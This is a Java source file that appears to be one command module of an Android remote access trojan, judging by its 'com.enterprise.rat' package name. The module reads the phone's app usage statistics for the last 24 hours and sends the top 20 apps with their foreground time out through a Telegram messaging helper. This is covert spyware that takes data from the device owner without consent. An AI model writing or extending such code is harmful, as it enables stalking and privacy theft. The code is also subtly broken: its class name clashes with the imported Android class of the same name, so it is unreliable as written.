package com.enterprise.rat.commands;

import android.app.usage.UsageStats;
import android.app.usage.UsageStatsManager;
import android.content.Context;
import com.enterprise.rat.utils.TelegramApi;

public class UsageStatsManager {
    private Context context;
    public UsageStatsManager(Context context) { this.context = context; }
    public void getStats() {
        UsageStatsManager usm = (UsageStatsManager) context.getSystemService(Context.USAGE_STATS_SERVICE);
        java.util.List<UsageStats> stats = usm.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, System.currentTimeMillis()-86400000, System.currentTimeMillis());
        if (stats == null || stats.isEmpty()) { TelegramApi.sendMessage("No usage data."); return; }
        stats.sort((a, b) -> Long.compare(b.getTotalTimeInForeground(), a.getTotalTimeInForeground()));
        StringBuilder sb = new StringBuilder("<b>📊 App Usage (24h)</b>\n\n");
        int i=0;
        for (UsageStats s : stats) { if (i++ >= 20) break; if (s.getTotalTimeInForeground() > 0) sb.append("<b>").append(s.getPackageName()).append(":</b> ").append(s.getTotalTimeInForeground()/60000).append("m\n"); }
        TelegramApi.sendMessage(sb.toString());
    }
}
